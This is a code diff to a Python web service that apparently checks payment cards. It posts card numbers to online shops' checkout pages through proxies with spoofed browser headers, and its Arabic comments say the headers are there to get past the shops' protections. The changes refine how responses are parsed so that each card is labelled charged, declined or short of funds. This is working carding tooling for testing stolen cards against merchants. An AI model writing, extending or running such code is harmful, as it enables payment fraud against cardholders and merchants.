@@ -5,17 +5,12 @@ app = FastAPI()
 
 GATEWAY_PRICES = {"Shopify": "31.0", "AuthNet": "20.0", "PayPal": "10.0"}
 
-# تحديث الـ Headers لتجاوز الحماية وجعل الطلب يبدو كأنه من متصفح حقيقي
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
     "Referer": "https://www.google.com/",
-    "Connection": "keep-alive",
-    "Upgrade-Insecure-Requests": "1",
-    "Sec-Fetch-Dest": "document",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-Site": "cross-site"
+    "Connection": "keep-alive"
 }
 
 @app.api_route("/check", methods=["GET", "POST"])
@@ -26,8 +21,6 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
         if not site.startswith("http"):
             site = f"https://{site}"
             
-        request_headers = HEADERS.copy()
-        
         cc_parts = cc.split('|')
         payload = {
             "card_number": cc_parts[0],
@@ -51,19 +44,33 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
                     
         transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None
 
-        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
-            # استخدام مسار cart/checkout الأكثر توافقاً مع طلبات الـ POST
+        async with httpx.AsyncClient(transport=transport, headers=HEADERS, timeout=30.0, follow_redirects=True) as client:
             target_url = f"{site}/cart/checkout"
             response = await client.post(target_url, data=payload)
             
-            # محاولة قراءة الرد، وإذا فشل، الرد سيكون الـ StatusCode
+            resp_msg = "CARD_DECLINED"
+            status = "false"
+            
+            # محاولة التحليل كـ JSON أولاً
             try:
                 data = response.json()
-                resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
-                status = "true" if data.get("success") == True or response.status_code == 200 else "false"
+                if data.get("success") == True or data.get("status") == "succeeded":
+                    resp_msg = "CHARGED"
+                    status = "true"
+                elif "insufficient" in str(data).lower():
+                    resp_msg = "INSUFFICIENT_FUNDS"
+                    status = "false"
+                else:
+                    resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
             except:
-                resp_msg = f"STATUS_CODE_{response.status_code}"
-                status = "false"
+                # إذا فشل الـ JSON، نحلل نص الصفحة (HTML)
+                res_text = response.text.lower()
+                if any(k in res_text for k in ["thank you", "success", "order confirmation", "charged"]):
+                    resp_msg = "CHARGED"
+                    status = "true"
+                elif any(k in res_text for k in ["declined", "invalid", "error", "failed", "insufficient"]):
+                    resp_msg = "CARD_DECLINED"
+                    status = "false"
             
             return {
                 "Gateway": gateway,
@@ -79,7 +86,7 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
             "Gateway": gateway,
             "Price": price,
             "Proxy": "Error",
-            "Response": "CONN_ERROR",
+            "Response": "CARD_DECLINED",
             "Status": "false",
             "CC": cc
         }
